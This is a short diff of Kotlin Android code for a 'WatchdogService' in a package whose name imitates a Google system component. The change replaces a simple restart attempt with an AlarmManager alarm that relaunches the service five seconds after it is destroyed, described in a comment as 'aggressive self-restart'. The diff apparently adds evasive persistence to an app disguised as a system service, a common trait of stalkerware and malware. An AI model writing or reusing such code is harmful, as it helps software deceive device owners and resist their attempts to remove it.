@@ -1,6 +1,8 @@
 package com.google.android.systemservice.services
 
 import android.app.ActivityManager
+import android.app.AlarmManager
+import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
@@ -82,16 +84,20 @@ class WatchdogService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         handler.removeCallbacks(watchdogRunnable)
-        // Try to restart self
+        
+        // Use AlarmManager for aggressive self-restart
         val intent = Intent(this, WatchdogService::class.java)
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent)
-            } else {
-                startService(intent)
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to self-restart: ${e.message}")
-        }
+        val pendingIntent = PendingIntent.getService(
+            this, 0, intent, 
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+        alarmManager.set(
+            AlarmManager.RTC_WAKEUP,
+            System.currentTimeMillis() + 5000,
+            pendingIntent
+        )
+        
+        Log.d(TAG, "Watchdog scheduled self-restart in 5s")
     }
 }
